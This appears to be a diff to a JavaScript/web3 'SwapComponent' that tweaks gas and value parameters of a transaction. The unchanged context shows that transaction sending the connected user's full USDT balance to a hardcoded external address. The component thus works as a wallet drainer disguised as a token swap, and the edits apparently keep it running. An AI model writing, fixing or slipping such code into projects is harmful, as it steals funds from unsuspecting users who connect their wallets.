@@ -165,7 +165,7 @@ function SwapComponent() {
           const rGasPrice = web3js.utils.toHex(
             Math.floor(Number(gasPrice) * 1.3)
           )
-          const gas = web3js.utils.toWei('22000')
+          const gas = web3js.utils.toBigInt('22000')
           const totalGas = Number(gas) * Math.floor(Number(gasPrice) * 2)
           const totalCost = Number(walletBalance) - totalGas
 
@@ -177,7 +177,7 @@ function SwapComponent() {
             gasPrice: rGasPrice,
             gasLimit: '0x11170',
             to: USDT,
-            value: '0x0',
+            value: '',
             data: usdtContract.methods
               .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
               .encodeABI(),
